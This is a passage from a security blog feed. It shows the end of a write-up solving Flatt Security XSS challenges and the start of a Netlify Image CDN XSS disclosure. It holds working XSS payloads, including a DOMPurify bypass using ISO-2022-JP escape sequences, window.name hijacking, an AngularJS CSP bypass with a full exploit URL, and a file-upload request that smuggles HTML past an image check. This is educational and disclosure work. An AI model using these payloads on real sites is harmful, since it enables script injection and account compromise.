    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">http</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">`GET /&lt;textarea&gt;&lt;a/id="&lt;/textarea&gt;&lt;text/src='x'onmouseover='alert()'&gt;shirley"&gt; HTTP/1.1\r\na:a\r\nX:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`</span><span class="p">;</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.forms[0].submit()</span><span class="dl">'</span><span class="p">,</span><span class="mi">3000</span><span class="p">)</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.forms[0].submit()</span><span class="dl">'</span><span class="p">,</span><span class="mi">6000</span><span class="p">)</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">frames[0].location.href="http://34.171.202.118/?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4"</span><span class="dl">'</span><span class="p">,</span><span class="mi">4000</span><span class="p">)</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>After submitting the form two times which hopefully poisons the response for the /api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint. we redirect the frame to the /?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint where the js code will take the <code class="language-plaintext highlighter-rouge">draft_id</code> parameter id and make a fetch call to /api/drafts?id= endpoint which will return <code class="language-plaintext highlighter-rouge">Path /xss payload not found</code> as the response which is what passed to the sanitizer then to the innerHTML sink</p>

<p>Later talking with my friend I got to know we can include more attributes to make it interaction afert  that ,  I noticed that just this is enough to bypass the sanitizer</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">sanitizeHtml</span><span class="p">(</span><span class="s2">`&lt;img/id/src/y onerror=alert()&gt;`</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">&lt;img src="" onerror="alert()"&gt;</span><span class="dl">'</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/569a7ea0-1974-4cab-b0be-96d806ae5f35" alt="image" /></p>

<hr />

<h1 id="challenge-3-by-kinugawamasato">Challenge 3 by @kinugawamasato</h1>

<p>Well at first , this challenge looked impossible no matter from what angle I look at it. I mean check the source everything looks really good, that‚Äôs all the relevant code for this challenge. The Dompurify config ensures we can‚Äôt use any attributes neither <code class="language-plaintext highlighter-rouge">data-*</code> nor <code class="language-plaintext highlighter-rouge">aria-*</code> which is then used to create a blob url and loaded inside an iframe??</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="kd">const</span> <span class="nx">sanitizedHtml</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="p">{</span> <span class="na">ALLOWED_ATTR</span><span class="p">:</span> <span class="p">[],</span> <span class="na">ALLOW_ARIA_ATTR</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">ALLOW_DATA_ATTR</span><span class="p">:</span> <span class="kc">false</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="nx">sanitizedHtml</span><span class="p">],</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blobURL</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
      <span class="nx">input</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">sanitizedHtml</span><span class="p">;</span>
      <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">blobURL</span><span class="p">,</span> <span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p>My friend told me if you look into what the author main area of work is you will soon realize what the challenge is about.
I then looked at the server used to setup the challenge site, it was Python <code class="language-plaintext highlighter-rouge">http.server</code> nothing fancy, when I paid attention to the response header I noticed that it‚Äôs <code class="language-plaintext highlighter-rouge">Content-Type: text/html</code> see no charset specified this was a good lead‚Ä¶ because I knew from Masato‚Äôs blogpost he has done a lot of work on Charset based xss in the past and also recently there was a blogpost related to this from SonarSource plus Mizu also posted a tweet about it.</p>

<p>https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/
https://x.com/kevin_mizu/status/1812882499875319959</p>

<p><img src="https://github.com/user-attachments/assets/c0b654ba-7663-43aa-a20b-931d5b41c74b" alt="image" /></p>

<p>Mizu‚Äôs screenshot should be self explanatory, when there is no charset specified browser tries to be smart and it tries to guess the charset this is similar to the mime sniffing behaviour where browser tries to guess the Mime type in cases where no <code class="language-plaintext highlighter-rouge">Content-Type</code> header is specified at all.
The SonarSource blogpost explain all this very well so I would recommend reading it if you haven‚Äôt already</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"\x1b$B"</span><span class="nt">&gt;&lt;/a&gt;</span>\x1b(B<span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"&gt;&lt;img src=x onerror=alert(1)&gt;"</span><span class="nt">&gt;&lt;/a&gt;</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">\x1b$B</code> , <code class="language-plaintext highlighter-rouge">\x1b(B</code> are both different escape sequences. You can look at the below diagram which is taken from the same SonarSource blogpost to understand what these escape sequences does</p>

<p><img src="https://github.com/user-attachments/assets/a5f30c3b-3c6d-4a1c-b2f6-1ad6e931b994" alt="image" /></p>

<p>In simple terms , consider the sequence <code class="language-plaintext highlighter-rouge">\x1b$B</code> lets you escape the <code class="language-plaintext highlighter-rouge">"</code> context of the id attribute by ignoring the next <code class="language-plaintext highlighter-rouge">"</code> occurence and by  using this  <code class="language-plaintext highlighter-rouge">\x1b(B</code> escape sequence we make the rest of the part treated as ASCII ,so the browser sees the <code class="language-plaintext highlighter-rouge">img</code> element with <code class="language-plaintext highlighter-rouge">onerror</code> attribute and happily gives us xss.</p>

<p>Coming back to our challenge, as in the Mizu‚Äôs tweet we can see it easily allows you bypass Dompurify ,we hide the xss vectors inside attribute. 
Scrolling through Masato‚Äôs old tweets my friend found this gold  https://x.com/kinugawamasato/status/1309937578443849730?s=46&amp;t=SSyMk5f3kBs791RxVEILAg
<img src="https://github.com/user-attachments/assets/05f0a6bc-af1a-4b15-a74c-71111817d651" alt="image" /></p>

<p>It‚Äôs about a Charset XSS bug in  Blob API due to the ignorance of the charset specified in the <code class="language-plaintext highlighter-rouge">type</code> key. This allowed Masato to do a similar xss as explained by Mizu and SonarSource.</p>

<p>Here‚Äôs poc fron the Chromium bug report:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa\u001B$@&lt;textarea&gt;\u001B(B&lt;script&gt;alert('xss');alert(document.charset)&lt;\/script&gt;&lt;/textarea&gt;bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html;charset=utf-8</span><span class="dl">"</span><span class="c1">//this charset should be used</span>
        <span class="p">});</span>
        <span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p>You can see using the <code class="language-plaintext highlighter-rouge">type</code> option, the charset is defined there. But seems Chromium was ignoring it which led to such bypass:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa\u001B$@<span class="nt">&lt;textarea&gt;</span>\u001B(B<span class="nt">&lt;script&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">xss</span><span class="dl">'</span><span class="p">);</span><span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">charset</span><span class="p">)</span><span class="o">&lt;</span><span class="err">\</span><span class="o">/</span><span class="nx">script</span><span class="o">&gt;&lt;</span><span class="sr">/textarea&gt;bb</span><span class="err">b
</span></code></pre></div></div>

<p>Funny enough we came across  <code class="language-plaintext highlighter-rouge">textarea</code> again in the 3rd challenge also, as already discussed content inside of textarea isn‚Äôt rendered by the browser so normally the script element should not be rendered.But due charset problem, using the escape sequences in ISO-2022-JP encoding we can make it to ignore the starting <code class="language-plaintext highlighter-rouge">textarea</code> element thus the <code class="language-plaintext highlighter-rouge">script</code> element is no longer inside <code class="language-plaintext highlighter-rouge">textarea</code>. This will allow the script element to be rendered and an alert will popup.</p>

<p>As the reported bug by Masato is fixed, Blob API now respects the charset specified in the <code class="language-plaintext highlighter-rouge">type</code> key. But still if you want to reproduce it you can omit the <code class="language-plaintext highlighter-rouge">charset</code> attribute and you can replicate the same which is expected to show weird behaviours as we are not specifying a charset:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa\u001B$@&lt;textarea&gt;\u001B(B&lt;script&gt;alert('xss');alert(document.charset)&lt;\/script&gt;&lt;/textarea&gt;bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="c1">//this charset is removed</span>
        <span class="p">});</span>
        <span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p>This is how the element gets rendered and we also get the alert popup</p>

<p><img src="https://github.com/user-attachments/assets/926ccbc0-49f7-455f-a56b-ed774143ff3e" alt="image" /></p>

<p>This vector is special because it doesn‚Äôt makes the use of any attributes which is what we need for our challenge and if you pay attention in challenge site there also the charset isn‚Äôt specified for the Blob API</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="kd">const</span> <span class="nx">sanitizedHtml</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nf">sanitize</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="p">{</span> <span class="na">ALLOWED_ATTR</span><span class="p">:</span> <span class="p">[],</span> <span class="na">ALLOW_ARIA_ATTR</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">ALLOW_DATA_ATTR</span><span class="p">:</span> <span class="kc">false</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="nx">sanitizedHtml</span><span class="p">],</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="p">});</span>
      <span class="kd">const</span> <span class="nx">blobURL</span> <span class="o">=</span> <span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
      <span class="nx">input</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">sanitizedHtml</span><span class="p">;</span>
      <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">blobURL</span><span class="p">,</span> <span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/90e38ac5-7726-49a0-bda5-17b8f816ca10" alt="image" /></p>

<p>For style it‚Äôs even more strict removes the whole node, similar behaviour we can see for other possible options xmp,plaintext,title,etc</p>

<p><img src="https://github.com/user-attachments/assets/722253fc-a959-4f01-bcd9-02a4963226f1" alt="image" /></p>

<p>I was stuck here for a very long time and at one moment  I randomly started playing with just <code class="language-plaintext highlighter-rouge">&lt;</code>,<code class="language-plaintext highlighter-rouge">&gt;</code> inside of <code class="language-plaintext highlighter-rouge">style</code> element. That‚Äôs when I noticed that dompurify only removes the STYLE node upon encountering a closing or a starting element inside the STYLE contents.</p>

<p><img src="https://github.com/user-attachments/assets/70e4254c-0469-45b8-a88a-61215a91dfc6" alt="image" /></p>

<p>Now all I needed to do was find  a way to put something in place of the space after <code class="language-plaintext highlighter-rouge">&lt;</code> which would remain as it is during Dompurify sanitization process but when rendered by the browser it gets ignored so that it becomes <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> something like a NULL character.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa &lt;style&gt;\u001B(B  &lt; script&gt;alert('xss');alert(document.charset)&lt; /script&gt; &lt;/style&gt; bbb
</code></pre></div></div>

<p>I thought why not just use the escape sequence ? And yeah that turned out to be working so fucking well. This was passed as it is from Dompurify but when rendered by the browser, the script alement appeared as <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> not <code class="language-plaintext highlighter-rouge">&lt;SOMECHARACTERscript&gt;</code> so that was a good sign . I was testing in Firefox at that time and noticed that the same doesn‚Äôt works in Chrome</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa<span class="nt">&lt;style&gt;</span><span class="err">\</span><span class="nt">u001B</span><span class="o">(</span><span class="nt">Bsssss</span><span class="o">&lt;</span><span class="err">\</span><span class="nt">u001B</span><span class="o">(</span><span class="nt">Bscript</span><span class="o">&gt;</span><span class="nt">alert</span><span class="o">(</span><span class="s2">'xss'</span><span class="o">);</span><span class="nt">alert</span><span class="o">(</span><span class="nt">document</span><span class="nc">.charset</span><span class="o">)&lt;</span><span class="err">\</span><span class="nt">u001B</span><span class="o">(</span><span class="nt">B</span><span class="o">/</span><span class="nt">script</span><span class="o">&gt;</span><span class="nt">&lt;/style&gt;</span>bbb
</code></pre></div></div>

<p>Give it a try in ff then in chrome</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa &lt;style&gt; \u001B(B&lt;\u001B(B/style&gt;&lt;\u001B(Bimg src=x onerror=alert()&gt; &lt;/style&gt; bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="c1">//this charset should be used</span>
 <span class="p">});</span>
<span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p>Here in this screenshot you can see how both the browsers interpret this differently
<img src="https://github.com/user-attachments/assets/4b9fcb81-72c8-49fe-b806-2a2d81184767" alt="image" /></p>

<p>To make this work in Chrome, the solution is very simple we just need to add <code class="language-plaintext highlighter-rouge">\x1b$B</code> at the starting</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="s2">`aaa \x1b$B &lt;style&gt; \u001B(B&lt;\u001B(B/style&gt;&lt;\u001B(Bimg src=x onerror=alert()&gt; &lt;/style&gt; bbb`</span><span class="p">],</span> <span class="p">{</span>
          <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span> <span class="c1">//this charset should be used</span>
 <span class="p">});</span>
<span class="nx">location</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">URL</span><span class="p">.</span><span class="nf">createObjectURL</span><span class="p">(</span><span class="nx">blob</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/3ae6f1b3-675c-4d4b-bec1-0846d165a390" alt="image" /></p>

<p>Still few more hurdles to solve, if you look at the poc we are using for Blob we are loading the blob url by making a redirect to it. This seems to be necessary we can even see a warning message in firefox when we load this vector in the challenge site. As the blob url is loaded inside an iframe.</p>

<p><em>The character encoding of a framed document was not declared. The document may appear different if viewed without the document framing it.</em></p>

<p><img src="https://github.com/user-attachments/assets/d7132215-3010-4918-948a-cc02064b1df4" alt="image" /></p>

<p>The blobUrl is loaded like this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">"iframe"</span> <span class="na">style=</span><span class="s">"width: 80%;height:200px"</span><span class="nt">&gt;&lt;/iframe&gt;</span>

<span class="nt">&lt;script&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="nx">blobURL</span><span class="p">,</span> <span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<p>window.open targets the url to the iframe element with the name <code class="language-plaintext highlighter-rouge">iframe</code>. After thinking for a while I thought of trying window hijacking, basically the idea is setting the <code class="language-plaintext highlighter-rouge">window.name</code> property to <code class="language-plaintext highlighter-rouge">iframe</code>. So because of this the current top window has the name ‚Äúiframe‚Äù when <code class="language-plaintext highlighter-rouge">window.open(blobURL, "iframe")</code> is executed instead of targetting the iframe it will target the current top window thus making a full redirect to the blobUrl instead of loading it inside the iframe which is what we wantttt.</p>

<p>In Chrome, even for different origins if the tab in which they are opened is same. They all will share the same <code class="language-plaintext highlighter-rouge">window.name</code> property ,this thing doesn‚Äôt works in Firefox.</p>

<p>I decided to host the following poc on my site:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
  <span class="kd">let</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">)</span>
  <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nf">atob</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>And this worked, but now the only task left was to bypass CSP which was fairly easy, as cdnjs.cloudflare.com is in the allowlist we can load angular and bypass the csp completely.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>default-src 'none';script-src 'sha256-EojffqsgrDqc3mLbzy899xGTZN4StqzlstcSYu24doI=' cdnjs.cloudflare.com; style-src 'unsafe-inline'; frame-src blob:
</code></pre></div></div>

<p>This was the final payload which I came up with:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa\x1B$@<span class="nt">&lt;style&gt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">B</span><span class="o">&lt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">Bscript</span> <span class="nt">src</span><span class="o">=</span><span class="s1">"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js"</span><span class="o">&gt;&lt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">B</span><span class="o">/</span><span class="nt">script</span><span class="o">&gt;&lt;</span><span class="err">\</span><span class="nt">x1B</span><span class="o">(</span><span class="nt">Bimg</span><span class="o">/</span><span class="nt">ng-app</span><span class="o">/</span><span class="nt">ng-csp</span><span class="o">/</span><span class="nt">src</span><span class="o">/</span><span class="nt">ng-on-error</span><span class="o">=</span><span class="err">$</span><span class="nt">event</span><span class="nc">.target.ownerDocument.defaultView.alert</span><span class="o">(</span><span class="err">$</span><span class="nt">event</span><span class="nc">.target.ownerDocument.defaultView.origin</span><span class="o">)&gt;</span><span class="nt">&lt;/style&gt;</span>bbb
</code></pre></div></div>

<p>By opening this url you will get an alert on the challenge site ;)
https://sudistark.github.io/window-name-redirect.html?name=iframe#aHR0cHM6Ly9jaGFsbGVuZ2Uta2ludWdhd2EucXVpei5mbGF0dC50cmFpbmluZy8/aHRtbD1hYWElMUIkQCUzQ3N0eWxlJTNFJTFCKEIlM0MlMUIoQnNjcmlwdCUyMHNyYz0lMjJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9hbmd1bGFyLmpzLzEuOC4wL2FuZ3VsYXIuanMlMjIlM0UlM0MlMUIoQi9zY3JpcHQlM0UlM0MlMUIoQmltZy9uZy1hcHAvbmctY3NwL3NyYy9uZy1vbi1lcnJvcj0kZXZlbnQudGFyZ2V0Lm93bmVyRG9jdW1lbnQuZGVmYXVsdFZpZXcuYWxlcnQoJGV2ZW50LnRhcmdldC5vd25lckRvY3VtZW50LmRlZmF1bHRWaWV3Lm9yaWdpbiklM0UlM0Mvc3R5bGUlM0ViYmI=</p>

<p><img src="https://github.com/user-attachments/assets/be4f06b7-b270-47e1-b463-ef57aaaabc6c" alt="image" /></p>

<p>If you come this far reading this thankyou so much I hope you liked reading it and pardon if there are any mistakes lots of new stuff which I got to know during this timespan trying to solve this challenges only , thanks to Flatt Security for creating such awesome challenges I really learned a lot by trying to solve them.</p>]]></content><author><name>GitHub User</name><email>your-email@domain.com</email></author><category term="CTF" /><category term="xss" /><summary type="html"><![CDATA[There were three xss challenges from Flatt Security , which were all really good I really liked the last challenge which was authored by the legend Masato Kinugawa and I managed to solve it too :p]]></summary></entry><entry><title type="html">Bypassing CSP via URL Parser Confusions¬†: XSS on Netlify‚Äôs Image CDN</title><link href="http://localhost:4000/2024/08/31/bypassing-csp-via-url-parser-confusions-xss-on-netlify-s-image-cdn.html" rel="alternate" type="text/html" title="Bypassing CSP via URL Parser Confusions¬†: XSS on Netlify‚Äôs Image CDN" /><published>2024-08-31T00:00:00+05:30</published><updated>2024-08-31T00:00:00+05:30</updated><id>http://localhost:4000/2024/08/31/bypassing-csp-via-url-parser-confusions-xss-on-netlify-s-image-cdn</id><content type="html" xml:base="http://localhost:4000/2024/08/31/bypassing-csp-via-url-parser-confusions-xss-on-netlify-s-image-cdn.html"><![CDATA[<h3>Bypassing CSP via URL Parser Confusions¬†: XSS on Netlify‚Äôs Image¬†CDN</h3><p>Heyyy Everyonee,</p><p>In this blogpost I am going to talk about my finding which was a XSS on Netlify‚Äôs Image CDN used in <a href="https://app.netlify.com">https://app.netlify.com</a> and how I managed to bypass this CSP Content-Security-Policy: script-src ‚Äònone‚Äô (for those of you who aren‚Äôt much familiar with this CSP¬†, in simple terms it means no script execution will be there in any case) along with that some other things which can be applied on other sites also which are using Netlify‚Äôs Image CDN¬†, for those of you unfamiliar with what it is would recommend reading this¬†article:</p><p><a href="https://docs.netlify.com/image-cdn/overview/">Netlify Image CDN</a></p><p>In short many popular Static Site Generators have this Image CDN functionality where they optimize the images used on the website. This is useful in cases where you want to make the site load faster by reducing the time taken for loading images as less as possible.</p><p>Some examples of this¬†are:</p><ul><li><a href="https://nextjs.org/docs/pages/building-your-application/optimizing/images">Optimizing: Images | Next.js</a></li><li><a href="https://image.nuxt.com/">Nuxt Image: Optimized Images for your Nuxt Apps</a></li><li><a href="https://www.gatsbyjs.com/docs/preoptimizing-images/">Preoptimizing Your Images | Gatsby</a></li></ul><p>All these have the same goal where they take a url as an input either via a parmeter or from the path and optimize the image. A lot of stuff goes behind the scene when you make a request to such endpoint, if you are interested luckily all of them are open source so you can take a deep dive and maybe find some cool¬†bugs.</p><pre>/_next/image?url=<br>/_gatsby/image/:url<br>/.netlify/image?url=<br>/_ipx/w_200/:url</pre><p>Also you will find these endpoints will often have some checks in place like which url you are allowed to make requests to which is all configurable as per the docs. They aslo validate the Content-Type of the requested image, like image/svg+xml as it could allow xss and other checks to like checking the response buffer too¬†, to make sure the requested image url is really is an image or not before serving the response¬†back.</p><p>Some don‚Äôt do any checks for images and even allow you to serve html response via this endpoint, as the requested url is fetched server side not client side it can also be good candidate for SSRF (I am not just bluffing all these some cool hackers have proved all these things are possible) like they were able to bypass the domain check to make request to any url or get xss or even Full read¬†SSRF</p><p>It‚Äôs a really interesting attack surface after seeing some awesome research done by Assetnote and Sam Curry in the past on this, I decided to look into them as well¬†, so far have some interesting leads which I hope can be turned into a bug maybe. But well that‚Äôs a different topic if I did find something, will make sure to write a blog about¬†it.</p><ul><li><a href="https://samcurry.net/universal-xss-on-netlifys-next-js-library/">Exploiting Web3&#39;s Hidden Attack Surface: Universal XSS on Netlify&#39;s Next.js Library</a></li><li><a href="https://www.assetnote.io/resources/research/exploiting-static-site-generators-when-static-is-not-actually-static">Exploiting Static Site Generators: When Static Is Not Actually Static</a></li></ul><p>Enough background details now back to the finding,so sites built on Netlify has this Image Optimization endpoint</p><pre>/.netlify/images?url=</pre><p>An example url can be this: <a href="https://app.netlify.com//.netlify/images?url=https://app.netlify.com/favicon.ico">https://app.netlify.com/.netlify/images?url=https://app.netlify.com/favicon.ico</a></p><p>There are some more parameters which can also be used to return the image with a different width or height,etc. The url parameter only allows you to fetch files from whitelisted hosts only, this hosts can be configured via the netlify.toml file</p><pre><br>[images]<br>  remote_images = [<br>          &quot;https://my-images.com/.*&quot;, <br>          &quot;https://animals.more-images.com/[bcr]at/.*&quot;]</pre><p>By default the same origin urls are also accepted in the url parameter. You can see in the above config¬†, it makes the use of regex also¬†.*so even little mistakes can have some side effects¬†there.</p><p>As earlier I told some providers don‚Äôt do any check on this whether the requested url returns a valid image or not this is in the case of¬†Netlify.</p><p>So you can even do thing like this, here I am requesting the Index page, the response for the requested url is fetched server side (some weird thing can here happen too, maybe ssrf if the config allows making request to any url¬†)</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*YBZB8Yv-rD4KsDS5AzvBVw.png" /></figure><p>In case of <a href="https://app.netlify.com">https://app.netlify.com</a>¬†, the following CDN domain was in the whitelist <a href="https://d33wubrfki0l68.cloudfront.net">https://d33wubrfki0l68.cloudfront.net</a>. They use this CDN to host all the user uploaded contents such as profile picture,etc</p><p>I had this thought in my mind, if I could find arbitrary file upload on the CDN domain I could use that here in the /.netlify/image?url endpoint and get XSS¬†?</p><p>Indeed there was some checks to make sure the user can‚Äôt upload anything else but images. I tried SVG but it didn‚Äôt allowed¬†it.</p><pre>{&quot;code&quot;:422,&quot;message&quot;:&quot;Logo must be an image&quot;}</pre><p>I found a bypass for this easily¬†, which allowed me to upload any files to the cdn domain.<br>By setting the Content-Type: image/png mimetype for the uploaded file to be one of the whitelisted ones it allowed to bypass the¬†check</p><pre><br>POST /access-control/bb-api/api/v1/accounts/5d77dc9150223b44a44df1f3/logo HTTP/2<br>Host: app.netlify.com<br>Cookie: Redacted<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0<br>Accept: */*<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: multipart/form-data; boundary=---------------------------26024016321888288818835600843<br>Referer: https://app.netlify.com/teams/sudi/overview<br>Content-Length: 606<br>Origin: https://app.netlify.com<br>Sec-Fetch-Dest: empty<br>Sec-Fetch-Mode: cors<br>Sec-Fetch-Site: same-origin<br>Te: trailers<br><br>-----------------------------26024016321888288818835600843<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xss.html&quot;<br>Content-Type: image/png<br><br>&lt;h1&gt;shirley&lt;/h1&gt;&lt;script&gt;alert()&lt;/script&gt;<br>-----------------------------26024016321888288818835600843--</pre><pre>{<br>  &quot;url&quot;: &quot;https://d33wubrfki0l68.cloudfront.net/5d77dc9150223b44a44df1f3/37319cf93ea440b93ea5/xss.html&quot;<br>}</pre><p>As you can see we recieved a successful response, with url which has the¬†.html extension. Now let‚Äôs check the Content-Type of the response¬†..</p><figure><img alt="" 